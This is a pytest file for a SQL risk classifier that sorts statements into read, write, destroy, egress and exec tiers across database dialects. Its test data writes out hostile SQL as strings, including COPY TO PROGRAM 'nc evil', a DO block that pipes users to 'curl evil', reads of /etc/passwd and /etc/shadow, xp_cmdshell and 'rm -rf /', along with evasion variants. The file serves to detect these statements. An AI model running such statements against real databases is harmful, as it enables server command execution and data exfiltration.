    deny list, not a blanket 'any function is a write'."""
    d = descriptor_from_sql(sql, dialect="postgres")
    assert d.effect == Effect.READ, f"{sql!r}: {d.effect} (reasons={d.reasons})"


@pytest.mark.parametrize(
    "sql",
    [
        pytest.param("SELECT * FROM postgresql('h','db','t','u','p')", id="postgresql"),
        pytest.param("SELECT * FROM mysql('h','db','t','u','p')", id="mysql"),
        pytest.param("SELECT * FROM remoteSecure('h', db.t)", id="remote-secure"),
        pytest.param("SELECT * FROM s3Cluster('c','http://x')", id="s3-cluster"),
        pytest.param("SELECT * FROM urlCluster('c','http://x')", id="url-cluster"),
        pytest.param("SELECT * FROM hdfs('hdfs://x')", id="hdfs"),
        pytest.param("SELECT * FROM azureBlobStorage('x')", id="azure-blob"),
        pytest.param("SELECT * FROM gcs('x')", id="gcs"),
        pytest.param("SELECT * FROM jdbc('x','y')", id="jdbc"),
        pytest.param("SELECT * FROM odbc('x','y','z')", id="odbc"),
        pytest.param("SELECT * FROM mongodb('h','db','c','u','p','a String')", id="mongodb"),
        pytest.param("SELECT * FROM redis('h','k','a String')", id="redis"),
        pytest.param("SELECT * FROM sqlite('/x.db','t')", id="sqlite"),
        pytest.param("SELECT * FROM deltaLake('x')", id="deltalake"),
        pytest.param("SELECT * FROM iceberg('x')", id="iceberg"),
    ],
)
def test_clickhouse_remote_and_storage_functions_are_egress(sql: str) -> None:
    """ClickHouse remote/storage table functions dial an external host or read
    arbitrary storage from the customer's server (SSRF / credentials in SQL / file
    read); a ``readonly=1`` session still runs them, so the classifier must land them
    on the egress floor, never a plain read."""
    d = descriptor_from_sql(sql, dialect="clickhouse")
    assert d.effect == Effect.EGRESS, f"{sql!r}: {d.effect} (reasons={d.reasons})"
    assert d.statements[0].dangerous_functions


@pytest.mark.parametrize(
    "sql",
    [
        pytest.param("SELECT * FROM numbers(10)", id="numbers"),
        pytest.param("SELECT * FROM system.tables", id="system-tables"),
        pytest.param("SELECT count(*) FROM events", id="count"),
    ],
)
def test_clickhouse_local_reads_stay_a_read(sql: str) -> None:
    """The asymmetric half: an ordinary ClickHouse read (a local generator, a system
    table, a plain aggregate) is not swept up by the remote-function deny list."""
    d = descriptor_from_sql(sql, dialect="clickhouse")
    assert d.effect == Effect.READ, f"{sql!r}: {d.effect} (reasons={d.reasons})"


# A Tinybird connection carries dialect="tinybird", a name sqlglot doesn't know. Before the
# alias that degraded to the NEUTRAL grammar, which can't parse ClickHouse's parametric
# aggregates, constant CTEs, SETTINGS or FORMAT — so ordinary reads failed closed to
# write/unknown and the tool gate refused them as unprovable reads, while the connector
# classified the very same SQL with classifier_dialect="clickhouse" and got read/exact.
_TINYBIRD_READS = [
    pytest.param(
        "SELECT engine, quantile(0.95)(latency_ms) AS p95 FROM prompt_runs GROUP BY engine",
        id="parametric-aggregate",
    ),
    pytest.param(
        "WITH toDate('2026-08-19') AS cut "
        "SELECT countIf(day < cut), countIf(day >= cut) FROM sov_daily",
        id="constant-cte",
    ),
    pytest.param("SELECT count() FROM mentions SETTINGS max_threads = 1", id="settings"),
    pytest.param("SELECT 1 FORMAT JSON", id="format-json"),
]


@pytest.mark.parametrize("sql", _TINYBIRD_READS)
def test_tinybird_dialect_classifies_clickhouse_reads_as_read(sql: str) -> None:
    """The four ClickHouse-only read shapes a model naturally writes against a Tinybird
    workspace are provable reads, not unknown writes."""
    d = descriptor_from_sql(sql, dialect="tinybird")
    assert d.effect == Effect.READ, f"{sql!r}: {d.effect} (reasons={d.reasons})"
    assert d.confidence == "exact", f"{sql!r}: {d.confidence}"


@pytest.mark.parametrize("sql", _TINYBIRD_READS)
def test_tinybird_dialect_matches_clickhouse_exactly(sql: str) -> None:
    """Lockstep: the GATE (conn.dialect="tinybird") and the CONNECTOR
    (spec.classifier_dialect="clickhouse") must reach the identical descriptor, or an approved
    write's cap-token fingerprint never matches the one the connector recomputes."""
    tb = descriptor_from_sql(sql, dialect="tinybird")
    ch = descriptor_from_sql(sql, dialect="clickhouse")
    assert (tb.effect, tb.confidence) == (ch.effect, ch.confidence)
    assert tb.fingerprint() == ch.fingerprint(), (
        f"{sql!r}: {tb.fingerprint()} != {ch.fingerprint()}"
    )


@pytest.mark.parametrize(
    ("sql", "effect"),
    [
        pytest.param("UPDATE t SET x = 1 WHERE id = 1", Effect.WRITE, id="update"),
        pytest.param("INSERT INTO t SELECT * FROM u", Effect.WRITE, id="insert-select"),
        pytest.param("ALTER TABLE t ADD COLUMN c Int32", Effect.WRITE, id="alter"),
        # A read smuggling a DROP in as a second statement: the multi-statement max still
        # takes the DESTROY, the alias does not let the leading SELECT vouch for it.
        pytest.param("SELECT 1; DROP TABLE x", Effect.DESTROY, id="multi-statement-drop"),
    ],
)
def test_tinybird_alias_does_not_soften_writes(sql: str, effect: Effect) -> None:
    """The asymmetric half: a more specific grammar must only make more reads PROVABLE, never
    make a write look like a read. Every mutation stays at (or above) its write tier."""
    d = descriptor_from_sql(sql, dialect="tinybird")
    assert d.effect == effect, f"{sql!r}: {d.effect} (reasons={d.reasons})"
    assert d.effect != Effect.READ


def test_tinybird_settings_readonly_zero_is_still_only_a_select() -> None:
    """``SETTINGS readonly=0`` rides along on a SELECT, and a SELECT cannot mutate whatever
    that setting says — ClickHouse itself refuses to lower ``readonly`` from 1 within a
    session, and Tinybird's read-only enforcement is the TOKEN's scope (READ_SCOPES), not a
    per-query setting a statement could talk its way out of. So it stays a read, identically
    under both spellings — the alias changes nothing here."""
    tb = descriptor_from_sql("SELECT * FROM t SETTINGS readonly=0", dialect="tinybird")
    ch = descriptor_from_sql("SELECT * FROM t SETTINGS readonly=0", dialect="clickhouse")
    assert tb.effect == Effect.READ
    assert (tb.effect, tb.confidence) == (ch.effect, ch.confidence)


def test_unknown_dialect_name_still_degrades_to_neutral() -> None:
    """The alias table is an allowlist, not a fallback: a name that is neither known to sqlglot
    nor aliased still degrades to the neutral grammar rather than raising."""
    d = descriptor_from_sql("SELECT 42 AS a", dialect="not_a_real_dialect")
    assert d.effect == Effect.READ
    assert d.confidence == "exact"


# --------------------------------------------------------------------------- #
# EXEC — server-side program execution and server-filesystem access.
#
# A statement that runs a program on the DATABASE HOST, or reads/writes the
# server's filesystem, is its own tier: more dangerous than data egress, NEVER
# auto-allowed in any stance, and refused even under `bypass` unless an explicit
# rule grants it. `COPY ... FROM PROGRAM` was the reported bug (it classified
# WRITE, so `auto` cleared it via the judge and `default` showed a generic write
# card). Every dialect the connectors speak is covered, plus the evasions a
# lexical bug would slip. Each case is paired with a negative sibling below so a
# blanket "any COPY / any function → EXEC" cannot pass.
# --------------------------------------------------------------------------- #

_EXEC_CASES = [
    # --- Postgres: program execution + server filesystem ---
    pytest.param("postgres", "COPY t FROM PROGRAM 'id'", id="pg-copy-from-program"),
    pytest.param("postgres", "COPY t TO PROGRAM 'nc evil 80'", id="pg-copy-to-program"),
    pytest.param("postgres", "COPY t FROM '/etc/passwd'", id="pg-copy-from-file"),
    pytest.param("postgres", "COPY t TO '/tmp/x.csv'", id="pg-copy-to-file"),
    pytest.param("postgres", "COPY t TO E'/tmp/x'", id="pg-copy-to-escape-file"),
    pytest.param("postgres", "SELECT pg_read_file('/etc/passwd')", id="pg-read-file"),
    pytest.param("postgres", "SELECT pg_read_binary_file('/etc/shadow')", id="pg-read-binary-file"),
    pytest.param("postgres", "SELECT pg_ls_dir('/')", id="pg-ls-dir"),
    pytest.param("postgres", "SELECT pg_ls_waldir()", id="pg-ls-waldir"),
    pytest.param("postgres", "SELECT lo_import('/etc/passwd')", id="pg-lo-import"),
    pytest.param("postgres", "SELECT lo_export(16384, '/tmp/pwn')", id="pg-lo-export"),
    pytest.param("postgres", "CREATE EXTENSION dblink", id="pg-create-extension-dblink"),
    pytest.param(
        "postgres",
        "CREATE EXTENSION IF NOT EXISTS postgres_fdw",
        id="pg-create-extension-fdw",
    ),
    pytest.param("redshift", "SELECT pg_read_file('/etc/passwd')", id="rs-read-file"),
    # --- MySQL: server filesystem + shell UDFs ---
    pytest.param("mysql", "LOAD DATA INFILE '/etc/passwd' INTO TABLE t", id="my-load-data-infile"),
    pytest.param(
        "mysql",
        "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t",
        id="my-load-data-local-infile",
    ),
    pytest.param("mysql", "SELECT * INTO OUTFILE '/tmp/x' FROM t", id="my-outfile"),
    pytest.param("mysql", "SELECT * INTO DUMPFILE '/tmp/x' FROM t", id="my-dumpfile"),
    pytest.param("mysql", "SELECT sys_exec('id')", id="my-sys-exec"),
    pytest.param("mysql", "SELECT sys_eval('id')", id="my-sys-eval"),
    # --- Snowflake / T-SQL: program execution ---
    pytest.param("snowflake", "SELECT system$execute_program('rm -rf /')", id="sf-execute-program"),
    pytest.param("tsql", "EXEC xp_cmdshell 'whoami'", id="tsql-xp-cmdshell"),
    # --- ClickHouse: server file / program / admin ---
    pytest.param("clickhouse", "SELECT * FROM file('/etc/passwd')", id="ch-file"),
    pytest.param(
        "clickhouse", "SELECT * FROM executable('id','TSV','a String')", id="ch-executable"
    ),
    pytest.param("clickhouse", "SYSTEM RELOAD CONFIG", id="ch-system-reload"),
    pytest.param("clickhouse", "SYSTEM SHUTDOWN", id="ch-system-shutdown"),
    # --- DuckDB / SQLite: attach + extension load (native code) ---
    pytest.param("duckdb", "ATTACH '/etc/x.db' AS x", id="duckdb-attach"),
    pytest.param("duckdb", "INSTALL httpfs", id="duckdb-install"),
    pytest.param("duckdb", "LOAD httpfs", id="duckdb-load-extension"),
    pytest.param("sqlite", "SELECT load_extension('/tmp/evil.so')", id="sqlite-load-extension"),
    # --- Evasions the classifier must still catch ---
    pytest.param("postgres", "copy t from program 'id'", id="evade-lowercase"),
    pytest.param("postgres", "COPY/**/t FROM PROGRAM 'id'", id="evade-comment-between-tokens"),
    pytest.param("postgres", "COPY \"t\" FROM PROGRAM 'id'", id="evade-quoted-identifier"),
    pytest.param("postgres", "SELECT 1; COPY t FROM PROGRAM 'id'", id="evade-after-semicolon"),
    pytest.param(
        "postgres",
        "DO $$ BEGIN COPY users TO PROGRAM 'curl evil -d @-'; END $$",
        id="evade-do-block",
    ),
    pytest.param(
        "snowflake",
        "EXECUTE IMMEDIATE 'COPY t FROM PROGRAM ''id'''",
        id="evade-execute-immediate",
    ),
]


@pytest.mark.parametrize(("dialect", "sql"), _EXEC_CASES)
def test_server_exec_and_filesystem_access_is_exec(dialect: str, sql: str) -> None:
    """Program execution / server-filesystem access is EXEC — its own tier, the
    floor, and above egress in a multi-statement max."""
    d = descriptor_from_sql(sql, dialect=dialect)
    assert d.effect == Effect.EXEC, f"[{dialect}] {sql!r}: {d.effect} (reasons={d.reasons})"
    assert is_floor(d)


@pytest.mark.parametrize(("dialect", "sql"), _EXEC_CASES)
def test_exec_is_never_auto_allowed_and_bypass_refuses_without_a_rule(
    dialect: str, sql: str
) -> None:
    """The security contract at the policy: EXEC prompts in default/auto (the
    human floor, never the judge) and — the property that separates it from
    destroy/egress — `bypass` REFUSES it, because a shared box's stance cannot
    hand a program on the data host over without a person or an explicit rule."""
    from alkera_cli.plugins.plugin_base.permissions import (
        AutoDecision,
        decide,
        evaluate_action,
    )

    d = descriptor_from_sql(sql, dialect=dialect)
    for mode in ("default", "auto"):
        assert decide(d, mode=mode) >= AutoDecision.PROMPT, f"auto-allowed in {mode}"
    bypass = evaluate_action(d, mode="bypass")
    assert bypass.decision == AutoDecision.REJECT, f"bypass ran EXEC {sql!r}"


_EXEC_NEGATIVES = [
    # COPY that stays a plain write / egress — not program exec, not server fs.
    pytest.param("postgres", "COPY t FROM STDIN", Effect.WRITE, id="neg-copy-from-stdin"),
    pytest.param("postgres", "COPY (SELECT 1) TO STDOUT", Effect.WRITE, id="neg-copy-to-stdout"),
    pytest.param("redshift", "COPY t FROM 's3://b/k'", Effect.WRITE, id="neg-copy-from-s3-load"),
    pytest.param(
        "snowflake", "COPY INTO @my_stage FROM t", Effect.EGRESS, id="neg-copy-into-stage"
    ),
    pytest.param("snowflake", "COPY INTO t FROM @my_stage", Effect.WRITE, id="neg-copy-load-stage"),
    pytest.param("snowflake", "GET @stage file:///tmp/x", Effect.EGRESS, id="neg-get-stage"),
    pytest.param("snowflake", "PUT file:///tmp/x @stage", Effect.EGRESS, id="neg-put-stage"),
    pytest.param(
        "bigquery",
        "EXPORT DATA OPTIONS(uri='gs://b/*') AS SELECT 1",
        Effect.EGRESS,
        id="neg-bq-export",
    ),
    # Network table functions are egress (SSRF), not the server-fs/exec tier.
    pytest.param(
        "clickhouse", "SELECT * FROM url('http://x','CSV')", Effect.EGRESS, id="neg-ch-url"
    ),
    pytest.param("clickhouse", "SELECT * FROM s3('http://x')", Effect.EGRESS, id="neg-ch-s3"),
    # A column named `program`, and a string literal that merely spells the attack.
    pytest.param(
        "postgres", "SELECT program FROM jobs", Effect.READ, id="neg-column-named-program"
    ),
    pytest.param(
        "postgres",
        "SELECT 'COPY t FROM PROGRAM cat' AS note",
        Effect.READ,
        id="neg-string-literal",
    ),
    pytest.param("postgres", "SELECT program_name FROM t", Effect.READ, id="neg-program-column"),
]


@pytest.mark.parametrize(("dialect", "sql", "effect"), _EXEC_NEGATIVES)
def test_exec_negatives_keep_their_class(dialect: str, sql: str, effect: Effect) -> None:
    """The asymmetric half: STDIN/STDOUT, an object-store COPY, a stage
    load/unload, a network table function, a column literally named `program`,
    and a string that only spells the attack must NOT be swept into EXEC."""
    d = descriptor_from_sql(sql, dialect=dialect)
    assert d.effect == effect, f"[{dialect}] {sql!r}: {d.effect} (reasons={d.reasons})"
    assert d.effect != Effect.EXEC


# --------------------------------------------------------------------------- #
# EXEC shapes the first table missed: an adminpack file write, a server-side
# connection, the log directory, the Postgres names on a connection with no
# recognized dialect, a shared-library LOAD, a routine in C or an untrusted
# language, ALTER SYSTEM (archive_command is a program the server runs), and a
# PREPARE whose body reaches the host. Each read READ or WRITE before.
# --------------------------------------------------------------------------- #

_EXEC_CASES_MORE = [
    pytest.param("postgres", "SELECT pg_file_write('x', 'y', false)", id="pg-file-write"),
    pytest.param("postgres", "SELECT pg_file_unlink('x')", id="pg-file-unlink"),
    pytest.param("postgres", "SELECT dblink_connect('host=10.0.0.1')", id="pg-dblink-connect"),
    pytest.param(
        "postgres", "SELECT dblink_connect_u('c', 'host=10.0.0.1')", id="pg-dblink-connect-u"
    ),
    pytest.param("postgres", "SELECT * FROM pg_ls_logdir()", id="pg-ls-logdir"),
    pytest.param("postgres", "SELECT pg_ls_tmpdir()", id="pg-ls-tmpdir"),
    pytest.param("postgres", "SELECT pg_stat_file('postgresql.conf')", id="pg-stat-file"),
    pytest.param("", "SELECT pg_read_file('/etc/passwd')", id="generic-pg-read-file"),
    pytest.param("sqlserver", "SELECT lo_export(1, '/tmp/x')", id="unmapped-dialect-lo-export"),
    pytest.param("postgres", "LOAD 'plpgsql'", id="pg-load-library"),
    pytest.param("postgres", "LOAD '$libdir/evil'", id="pg-load-libdir"),
    pytest.param(
        "postgres",
        "CREATE FUNCTION f() RETURNS int AS 'evil.so', 'f' LANGUAGE C",
        id="pg-create-function-c",
    ),
    pytest.param(
        "postgres",
        "CREATE FUNCTION f() RETURNS int AS $$ import os $$ LANGUAGE plpython3u",
        id="pg-create-function-plpython3u",
    ),
    pytest.param(
        "postgres",
        "CREATE OR REPLACE FUNCTION f() RETURNS int LANGUAGE plperlu AS $$ 1 $$",
        id="pg-create-or-replace-plperlu",
    ),
    pytest.param("postgres", "CREATE LANGUAGE plpython3u", id="pg-create-language"),
    pytest.param("postgres", "CREATE TRUSTED LANGUAGE plperl", id="pg-create-trusted-language"),
    pytest.param(
        "postgres",
        "ALTER SYSTEM SET archive_command = 'curl -d @%p evil'",
        id="pg-alter-system-set",
    ),
    pytest.param("postgres", "ALTER SYSTEM RESET ALL", id="pg-alter-system-reset"),
    pytest.param(
        "postgres",
        "PREPARE p AS SELECT pg_read_file('/etc/passwd')",
        id="pg-prepare-body",
    ),
    pytest.param(
        "postgres",
        "PREPARE p (text) AS SELECT pg_read_file($1); EXECUTE p('/etc/passwd')",
        id="pg-prepare-then-execute",
    ),
    pytest.param(
        "mysql", "PREPARE s FROM 'SELECT * INTO OUTFILE ''/tmp/x'' FROM t'", id="my-prepare-from"
    ),
]


@pytest.mark.parametrize(("dialect", "sql"), _EXEC_CASES_MORE)
def test_more_server_program_and_filesystem_shapes_are_exec(dialect: str, sql: str) -> None:
    d = descriptor_from_sql(sql, dialect=dialect)
    assert d.effect == Effect.EXEC, f"[{dialect}] {sql!r}: {d.effect} (reasons={d.reasons})"


_EXEC_MORE_NEGATIVES = [
    pytest.param(
        "postgres",
        "CREATE FUNCTION f() RETURNS int LANGUAGE plpgsql AS $$ BEGIN RETURN 1; END $$",
        Effect.WRITE,
        id="neg-plpgsql-function",
    ),
    pytest.param(
        "postgres",
        "CREATE FUNCTION f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$",
        Effect.WRITE,
        id="neg-sql-function",
    ),
    pytest.param("postgres", "ALTER TABLE t ADD COLUMN c int", Effect.WRITE, id="neg-alter-table"),
    pytest.param("postgres", "SELECT 1 AS system", Effect.READ, id="neg-column-named-system"),
    pytest.param("postgres", "PREPARE p AS SELECT 1", Effect.WRITE, id="neg-prepare-a-read"),
    pytest.param(
        "postgres", "PREPARE p AS DELETE FROM t", Effect.DESTROY, id="neg-prepare-a-delete"
    ),
    pytest.param("postgres", "SELECT dblink_disconnect('c')", Effect.READ, id="neg-dblink-close"),
    pytest.param("clickhouse", "SELECT file FROM t", Effect.READ, id="neg-ch-column-named-file"),
    pytest.param("", "SELECT count(*) FROM t", Effect.READ, id="neg-generic-read"),
]


@pytest.mark.parametrize(("dialect", "sql", "effect"), _EXEC_MORE_NEGATIVES)
def test_the_new_exec_shapes_leave_their_siblings_alone(
    dialect: str, sql: str, effect: Effect
) -> None:
    d = descriptor_from_sql(sql, dialect=dialect)
    assert d.effect == effect, f"[{dialect}] {sql!r}: {d.effect} (reasons={d.reasons})"


# --------------------------------------------------------------------------- #
# DuckDB: one tier per kind of statement.
#
# A PRAGMA that assigns a setting is a WRITE whether the value is quoted or not
# (memory_limit = '1GB' was READ, threads = 4 WRITE). Every way DuckDB reads a
# file or an object store into a result is one tier, EGRESS, the tier read_csv
# already had: read_text / read_blob / glob / a path or URL named as a table were
# READ. What a DuckDB connection may reach on disk is bounded by the engine lock,
# which landed separately; the tier is what makes a person or the judge see it.
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("sql", "effect"),
    [
        pytest.param("PRAGMA memory_limit = '1GB'", Effect.WRITE, id="quoted-setting"),
        pytest.param("PRAGMA memory_limit='1GB'", Effect.WRITE, id="quoted-setting-no-space"),
        pytest.param("PRAGMA threads = 4", Effect.WRITE, id="numeric-setting"),
        pytest.param("PRAGMA table_info('t')", Effect.READ, id="call-form"),
        pytest.param("PRAGMA database_size", Effect.READ, id="bare-query"),
    ],
)
def test_a_duckdb_pragma_that_assigns_is_a_write_however_the_value_is_spelled(
    sql: str, effect: Effect
) -> None:
    assert descriptor_from_sql(sql, dialect="duckdb").effect == effect


@pytest.mark.parametrize(
    "sql",
    [
        pytest.param("SELECT * FROM read_csv('x.csv')", id="read-csv"),
        pytest.param("SELECT * FROM read_text('/etc/passwd')", id="read-text"),
        pytest.param("SELECT * FROM read_blob('/etc/passwd')", id="read-blob"),
        pytest.param("SELECT * FROM glob('/etc/*')", id="glob"),
        pytest.param("SELECT * FROM read_json_auto('x.json')", id="read-json-auto"),
        pytest.param("SELECT * FROM read_ndjson('x.ndjson')", id="read-ndjson"),
        pytest.param("SELECT * FROM parquet_scan('x.parquet')", id="parquet-scan"),
        pytest.param("SELECT * FROM sqlite_scan('x.db', 't')", id="sqlite-scan"),
        pytest.param("SELECT * FROM '/etc/passwd'", id="bare-absolute-path"),
        pytest.param("SELECT * FROM 'data/*.parquet'", id="bare-relative-glob"),
        pytest.param("SELECT * FROM 'orders.csv'", id="bare-file-name"),
        pytest.param("SELECT * FROM 's3://bucket/k.parquet'", id="bare-object-store"),
    ],
)
def test_every_duckdb_file_read_is_one_tier(sql: str) -> None:
    d = descriptor_from_sql(sql, dialect="duckdb")
    assert d.effect == Effect.EGRESS, f"{sql!r}: {d.effect} (reasons={d.reasons})"


@pytest.mark.parametrize(
    "dialect", ["postgres", "snowflake", "databricks", "clickhouse", "trino", ""]
)
def test_an_object_store_url_named_as_a_table_is_egress_on_every_engine(dialect: str) -> None:
    d = descriptor_from_sql("SELECT * FROM 's3://bucket/k.parquet'", dialect=dialect)
    assert d.effect == Effect.EGRESS, f"[{dialect}]: {d.effect} (reasons={d.reasons})"


@pytest.mark.parametrize(
    ("dialect", "sql"),
    [
        pytest.param("duckdb", "SELECT * FROM t", id="duckdb-plain-table"),
        pytest.param("duckdb", "SELECT * FROM s.t", id="duckdb-qualified-table"),
        pytest.param("duckdb", 'SELECT * FROM "Order Items"', id="duckdb-quoted-table"),
        pytest.param("duckdb", "SELECT * FROM t WHERE name GLOB '*.csv'", id="glob-operator"),
        pytest.param("postgres", 'SELECT * FROM "a/b"', id="pg-quoted-name-with-slash"),
        pytest.param("postgres", 'SELECT * FROM "orders.csv"', id="pg-quoted-name-with-dot"),
    ],
)
def test_a_table_that_is_not_a_file_stays_a_read(dialect: str, sql: str) -> None:
    assert descriptor_from_sql(sql, dialect=dialect).effect == Effect.READ


@pytest.mark.parametrize(
    "sql",
    [
        pytest.param("SELECT * FROM parquet_bloom_probe('/etc/hosts', 'c', 1)", id="bloom-probe"),
        pytest.param(
            "SELECT * FROM query('SELECT * FROM read_text(''/etc/passwd'')')", id="query-runs-sql"
        ),
        pytest.param("SELECT * FROM query_table('orders.csv')", id="query-table"),
    ],
)
def test_duckdb_readers_that_hide_the_file_are_egress_too(sql: str) -> None:
    """``query('<sql>')`` runs SQL the walk cannot see into, and the bloom probe opens
    the file it names: both read what a person has not seen."""
    d = descriptor_from_sql(sql, dialect="duckdb")
    assert d.effect == Effect.EGRESS, f"{sql!r}: {d.effect} (reasons={d.reasons})"
